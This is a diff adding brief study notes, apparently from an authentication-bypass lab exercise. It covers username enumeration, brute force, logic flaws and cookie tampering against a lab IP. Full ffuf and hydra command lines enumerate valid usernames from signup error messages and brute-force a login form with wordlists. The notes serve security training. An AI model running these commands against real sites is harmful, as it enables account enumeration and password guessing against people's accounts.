@@ -1,0 +1,19 @@
+1-Username Enumeration
+	Website error messages are great resources for collating this information to build our list of valid usernames.
+		form to create a new user account
+	1-using ffuf :->  ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.127.105/customers/signup -mr "username already exists"
+
+2-Brute Force
+	using:
+		1-hydra -> hydra 10.10.127.105 http-form-post "/customers/login:username=^USER^&password=^PASS^:Invalid Username/Password Combination" -L Names.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -t 10 -w 30
+		hydra syntax:
+			hydra host or ip  http-form-post "path/of/login/page:username=^USER^&password=^PASS^:login faild massage" -L Names.txt -P Passwords.txt -t 10 -w 30
+		2-ffuf -w valid_usernames.txt:W1,password.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.127.105/customers/login -fc 200
+
+3-Logic Flaw
+	using curl
+
+4-Cookie Tampering
+	try to editing in cookie 
+	and if cookie hashed or encoded try to crack it 
+
